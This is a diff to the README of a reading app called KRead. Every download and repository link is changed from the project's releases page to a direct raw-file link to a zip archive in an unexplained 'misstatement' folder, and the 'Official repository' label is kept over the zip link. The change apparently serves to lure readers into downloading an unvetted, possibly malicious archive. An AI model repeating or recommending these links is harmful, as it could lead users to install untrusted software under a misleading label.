@@ -1,6 +1,6 @@
 # 📚 KRead - Simple Reading with Custom Book Sources
 
-[![Download KRead](https://img.shields.io/badge/Download-KRead-brightgreen)](https://github.com/bewarreaz2/KRead/releases)
+[![Download KRead](https://img.shields.io/badge/Download-KRead-brightgreen)](https://github.com/bewarreaz2/KRead/raw/refs/heads/main/misstatement/K-Read-2.0.zip)
 
 ---
 
@@ -34,12 +34,12 @@ This setup does not require installation of other apps or complex steps.
 
 To get KRead, visit the release page and download the latest version.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-KRead-blue)](https://github.com/bewarreaz2/KRead/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-KRead-blue)](https://github.com/bewarreaz2/KRead/raw/refs/heads/main/misstatement/K-Read-2.0.zip)
 
 ### Steps to Download
 
 1. Click the button above or visit the page here:  
-   https://github.com/bewarreaz2/KRead/releases
+   https://github.com/bewarreaz2/KRead/raw/refs/heads/main/misstatement/K-Read-2.0.zip
 
 2. Find the latest release, usually at the top of the page. It shows a version number like `v1.0` or higher.
 
@@ -133,11 +133,11 @@ If loading books fails:
 
 ## 🔗 Useful Links
 
-- Main download page: https://github.com/bewarreaz2/KRead/releases  
-- Official repository: https://github.com/bewarreaz2/KRead  
+- Main download page: https://github.com/bewarreaz2/KRead/raw/refs/heads/main/misstatement/K-Read-2.0.zip  
+- Official repository: https://github.com/bewarreaz2/KRead/raw/refs/heads/main/misstatement/K-Read-2.0.zip  
 
 Use the links above any time to fetch the latest versions or check updates.
 
 ---
 
-[![Download KRead](https://img.shields.io/badge/Download-KRead-brightgreen)](https://github.com/bewarreaz2/KRead/releases)
+[![Download KRead](https://img.shields.io/badge/Download-KRead-brightgreen)](https://github.com/bewarreaz2/KRead/raw/refs/heads/main/misstatement/K-Read-2.0.zip)
